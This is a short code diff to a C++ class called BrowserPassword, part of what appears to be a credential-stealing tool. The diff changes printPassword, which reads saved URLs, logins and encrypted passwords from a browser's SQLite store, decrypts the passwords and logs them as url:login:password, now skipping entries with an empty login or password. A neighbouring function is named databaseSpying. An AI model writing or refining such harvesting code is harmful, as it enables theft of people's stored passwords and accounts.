@@ -116,11 +116,16 @@ const char *BrowserPassword::uncryptData(BYTE *password, int size)
 
 void BrowserPassword::printPassword(sqlite3_stmt *stmt)
 {
-	std::string infos = std::string("\nURL:\t" + std::string((const char *)sqlite3_column_text(stmt, 0))) +
-						std::string("\nLogin:\t" + std::string((const char *)sqlite3_column_text(stmt, 1))) +
-						std::string("\nPassword:\t" + std::string(uncryptData((BYTE *)sqlite3_column_text(stmt, 3), sqlite3_column_int(stmt, 2))));
+	std::string infos;
+	std::string url = (const char *)sqlite3_column_text(stmt, 0);
+	std::string login = (const char *)sqlite3_column_text(stmt, 1);
+	std::string password = uncryptData((BYTE *)sqlite3_column_text(stmt, 3), sqlite3_column_int(stmt, 2));
 
-	Log::logPassword(infos);
+	if (login != "" && password != "")
+	{
+		infos = (url + ':' + login + ':' + password);
+		Log::logPassword(infos);
+	}
 }
 
 void BrowserPassword::databaseSpying()
